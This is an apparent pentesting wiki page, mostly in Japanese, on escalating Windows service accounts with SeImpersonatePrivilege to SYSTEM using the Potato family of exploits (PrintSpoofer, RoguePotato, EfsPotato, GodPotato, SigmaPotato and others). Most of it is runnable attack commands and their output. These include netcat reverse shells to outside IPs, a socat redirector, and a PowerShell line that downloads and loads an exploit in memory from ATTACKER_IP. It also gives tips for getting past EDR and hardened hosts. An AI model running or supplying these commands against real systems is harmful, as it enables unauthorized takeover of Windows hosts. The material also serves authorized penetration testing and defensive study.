# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotatoは動作しません**。Windows Server 2019 および Windows 10 build 1809 以降では利用できません。しかし、[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** を使用して、同等の特権を悪用し `NT AUTHORITY\SYSTEM` レベルのアクセスを取得できます。こちらの [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) は `PrintSpoofer` ツールを詳しく解説しており、JuicyPotato が動作しない Windows 10 / Server 2019 ホスト上で impersonation privileges を悪用する方法を説明しています。

> [!TIP]
> 2024–2025 年に頻繁にメンテナンスされている現代的な代替は SigmaPotato（GodPotato のフォーク）で、in-memory/.NET reflection の利用や拡張された OS サポートを追加しています。以下のクイック使用法と References のリポジトリを参照してください。

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 要件と一般的な注意点

以下の手法はすべて、次のいずれかの特権を持つコンテキストからインパーソネーション可能な特権サービスを悪用することに依存します:

- SeImpersonatePrivilege（最も一般的）または SeAssignPrimaryTokenPrivilege
- トークンに既に SeImpersonatePrivilege がある場合は High integrity は必須ではありません（IIS AppPool、MSSQL など多くのサービスアカウントで典型的です）。

特権を素早く確認する:
```cmd
whoami /priv | findstr /i impersonate
```
運用上の注意:

- シェルが SeImpersonatePrivilege を欠く制限付きトークンで動作している場合（特定の状況で Local Service/Network Service によく見られる）、FullPowers を使ってアカウントの既定の権限を回復し、その後 Potato を実行してください。例: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer は Print Spooler サービスが稼働し、ローカル RPC エンドポイント (spoolss) 経由で到達可能である必要があります。PrintNightmare 後に Spooler が無効化されているような強化された環境では RoguePotato/GodPotato/DCOMPotato/EfsPotato を優先してください。
- RoguePotato は TCP/135 上で到達可能な OXID resolver が必要です。egress がブロックされている場合は redirector/port-forwarder を使用してください（下の例を参照）。古いビルドでは -f フラグが必要でした。
- EfsPotato/SharpEfsPotato は MS-EFSR を悪用します。1つのパイプがブロックされている場合は代替のパイプを試してください（lsarpc, efsrpc, samr, lsass, netlogon）。
- RpcBindingSetAuthInfo 実行中のエラー 0x6d3 は通常、未知またはサポートされていない RPC 認証サービスを示します。別の pipe/transport を試すか、対象サービスが動作していることを確認してください。

## クイックデモ

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
注意:
- -i を使用すると現在のコンソールで対話型プロセスを起動できます。-c を使用するとワンライナーを実行できます。
- Spooler サービスが必要です。無効化されている場合は失敗します。

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
アウトバウンド135がブロックされている場合は、あなたのredirector上でsocat経由でOXID resolverをpivotしてください:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato は、Spooler/BITS の代わりに **PrintNotify** サービスを標的とする、2022 年末に公開された新しい COM 悪用プリミティブです。バイナリは PrintNotify COM サーバをインスタンス化し、偽の `IUnknown` を差し込み、`CreatePointerMoniker` を介して特権コールバックをトリガーします。PrintNotify サービス（**SYSTEM** として動作）がコールバックしてくると、そのプロセスは返されるトークンを複製し、完全な特権で指定されたペイロードを起動します。

Key operational notes:

* Print Workflow/PrintNotify サービスがインストールされている限り、Windows 10/11 および Windows Server 2012–2022 で動作します（レガシーの Spooler が PrintNightmare 後に無効化されていても存在します）。
* 呼び出しコンテキストが **SeImpersonatePrivilege** を保有していることを要求します（IIS APPPOOL、MSSQL、scheduled-task サービスアカウントで一般的）。
* 直接コマンドかインタラクティブモードのいずれかを受け付けるため、元のコンソール内にとどまることができます。例:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* 純粋に COM ベースであるため、named-pipe listeners や外部リダイレクタは不要で、Defender が RoguePotato の RPC binding をブロックするホスト上でのそのままの置き換えとして機能します。

Ink Dragon のようなオペレーターは、SharePoint 上で ViewState RCE を獲得した直後に PrintNotifyPotato を実行し、`w3wp.exe` ワーカーから **SYSTEM** へピボットして ShadowPad をインストールする前の踏み台とすることがあります。

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
ヒント: 1つの pipe が失敗するか EDR がブロックする場合は、他のサポートされている pipes を試してください:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
注:
- SeImpersonatePrivilege が有効な場合、Windows 8/8.1–11 および Server 2012–2022 で動作します。

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato は、デフォルトで RPC_C_IMP_LEVEL_IMPERSONATE に設定されている service DCOM objects を標的とする 2つのバリアントを提供します。Build するか提供された binaries を使用して、コマンドを実行します:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (更新された GodPotato フォーク)

SigmaPotato は、.NET reflection 経由の in-memory execution や PowerShell reverse shell helper などのモダンな機能を追加します。
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
